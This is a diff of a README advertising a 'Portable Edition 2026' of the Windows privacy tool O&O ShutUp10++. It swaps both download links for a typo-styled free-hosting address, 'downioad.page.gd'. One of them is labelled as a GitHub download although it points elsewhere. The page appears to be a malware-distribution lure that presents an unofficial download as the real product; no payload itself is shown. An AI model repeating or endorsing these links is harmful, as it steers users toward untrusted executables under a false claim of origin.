@@ -2,7 +2,7 @@
 
 Take command of your Windows 10 or 11 experience with O&O ShutUp10++ Portable Edition 2026. This comprehensive tool empowers you to manage and disable the built-in data collection and telemetry features of the operating system. It provides a clear, manageable interface to enhance your digital privacy and system performance by turning off unnecessary services and settings.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest_Build-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest_Build-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -53,7 +53,7 @@ A: The 2026 Portable Edition is designed to be compatible with recent updates to
 
 You can get the latest version of O&O ShutUp10++ Portable Edition 2026 from the official distribution page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
